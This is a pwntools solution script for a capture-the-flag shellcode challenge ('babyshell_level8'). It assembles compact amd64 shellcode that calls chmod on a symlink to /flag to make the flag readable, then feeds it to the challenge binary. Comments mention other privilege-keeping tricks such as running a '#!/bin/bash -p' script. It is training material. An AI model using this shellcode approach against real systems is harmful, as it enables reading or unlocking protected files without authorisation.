#using a symbloic link will be much better coz it takes much less bytes 
# or wiht calling a execve with a program with #!/bin/bash -p
from pwn import *
context.arch = 'amd64'
context.log_level='Debug'


# g is a symbloic link to /flag
file_path = "g"
shellcode="""
    push 0x67
    mov rdi, rsp
    push 4
    pop rsi
    push 0x5a
    pop rax
    syscall
     """
shellcode = asm(shellcode)

print(len(shellcode))
"""
for debug


with open('shell.bin','wb) as f:
    f.write(asm)
exit(1)

"""




# Execute the shellcode
p = process(['/challenge/babyshell_level8'])  

p.recv()
p.send(shellcode)
#p.recvall()
p.interactive()
print("[+] END")
